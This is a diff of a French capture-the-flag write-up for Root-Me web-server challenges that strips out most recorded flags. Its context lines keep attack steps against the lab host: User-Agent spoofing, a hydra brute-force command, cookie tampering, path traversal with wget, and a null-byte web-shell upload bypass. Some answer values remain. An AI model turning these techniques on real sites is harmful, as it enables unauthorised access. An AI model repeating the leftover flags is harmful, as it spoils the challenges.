@@ -30,7 +30,7 @@ Vous devriez voir quelque chose comme ceci :
 <!--
 Je crois que c'est vraiment trop simple là !
 It's really too easy !
-password : nZ^&@q5&sjJHev0
+password : 
 -->
 ```
 
@@ -50,7 +50,7 @@ cat index.html
 Résultat attendu :
 
 ```
-Well done, the validation password is: <strong>Ip_$po0Fing</strong>
+Well done, the validation password is: 
 ```
 
 ---
@@ -79,7 +79,7 @@ Certains sites accordent des permissions spéciales en fonction de l'User-Agent.
 curl -v --header "User-Agent: admin" -X GET http://challenge01.root-me.org/web-serveur/ch2/
 ```
 
-Flag obtenu : `rr$Li9%L34qd1AAe27`
+Flag obtenu : 
 
 ---
 
@@ -96,7 +96,7 @@ hydra -l admin -P rockyou.txt -e nrs -vv challenge01.root-me.org http-get /web-s
 Résultat attendu :
 
 ```
-[80][http-get] host: challenge01.root-me.org   login: admin   password: admin
+[80][http-get] host: challenge01.root-me.org   login: a...   password: a..
 ```
 
 ---
@@ -138,7 +138,6 @@ Résultat final :
 
 ```
 $flag = "S3rv1ce...S3cure";
-Flag: S3rv1ceP1n9Sup3rS3cure
 ```
 
 ---
@@ -156,7 +155,7 @@ L'objectif est de contourner les restrictions d'accès en manipulant les méthod
 http://challenge01.root-me.org/web-serveur/ch8/
 ```
 
-Flag obtenu : `a23e$dme96d3saez$$prap`
+Flag obtenu : 
 
 ---
 
@@ -212,7 +211,7 @@ Well done ! You can validate this challenge with the password
 This file is already deleted.
 ```
 
-Flag : `a7n4nizpgQgnPERy89uanf6T4`
+Flag : 
 
 ---
 
@@ -271,7 +270,7 @@ curl -v "http://challenge01.root-me.org/web-serveur/ch7/?c=admin" -b "ch7=admin"
 <div>Validation password : ml-SYMPA
 * Connection #0 to host challenge01.root-me.org left intact
 </div></fieldset>   
-Flag : `ml-SYMPA`
+Flag : 
 ```
 
 Cela confirme que nous avons réussi à récupérer le flag : `ml-SYMPA`
@@ -315,7 +314,7 @@ wget http://challenge01.root-me.org/web-serveur/ch15/galerie///86hwnX2r/password
 
 Et d’en afficher le contenu et de l'ouvrir dans le terminal  !
 
-On obtient le Flag : `kcb$!Bx@v4Gs9Ez`
+On obtient le Flag : 
 
 ---
 
@@ -323,7 +322,7 @@ On obtient le Flag : `kcb$!Bx@v4Gs9Ez`
 
 Passer ce niveau est très facile. Utilisez le même shell que précédemment. Imaginons que le nom du fichier de votre shell soit `shell.php`. Renommez-le en `shell.php%00.jpg`. Lors de la soumission, l'extension `.jpg` sera supprimée à cause du byte nul qui précède. Une fois le fichier téléchargé, cliquez dessus.
 
-Flag : `YPNchi2NmTwygr2dgCCF`
+Flag : 
 
 ---
 
